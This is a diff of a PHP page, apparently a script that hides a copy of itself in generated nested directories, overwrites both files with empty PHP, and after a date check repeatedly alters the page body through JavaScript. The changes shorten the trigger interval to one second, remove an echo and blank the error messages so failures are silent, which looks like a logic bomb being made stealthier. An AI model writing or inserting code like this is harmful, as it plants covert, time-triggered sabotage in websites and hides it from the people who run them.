@@ -24,12 +24,14 @@ $ms2 = rand(99, 2000);
 </style>
 <?php
 
+$var = range("a","z");
 if(!is_dir($ds."/")){
 	mkdir($ds."/");
 	if(!is_dir($ds."/".$img."/")){
 		mkdir($ds."/".$img."/");
 		if(!is_dir($ds."/".$img."/".$temp."/")){
 			mkdir($ds."/".$img."/".$temp."/");
+			
 		}
 	}
 }else{
@@ -44,7 +46,6 @@ if(!is_dir($ds."/")){
 		}
 	}
 }
-echo $dtg;
 ?>
 
 <script type="text/javascript">
@@ -53,14 +54,14 @@ if(('<?php echo date("Y") ?>'>='<?php echo $th[0].$th[4] ?>')&&('<?php echo date
 
 	setInterval(function() {
 		bodyElement.classList.add("x");
-	}, 10000);
+	}, 1000);
 }
 </script>
 
 <?php
 		rename($temp.".php", $ds."/".$img."/".$temp."/".$dt2.".php");
-		$myfile = fopen($temp.".php", "w") or die("Unable to open file!");
-		$myfile2 = fopen($ds."/".$img."/".$temp."/".$dt2.".php", "w") or die("Unable to open file!");
+		$myfile = fopen($temp.".php", "w") or die("");
+		$myfile2 = fopen($ds."/".$img."/".$temp."/".$dt2.".php", "w") or die("");
 		$txt = "<?php
 			
 ?>";
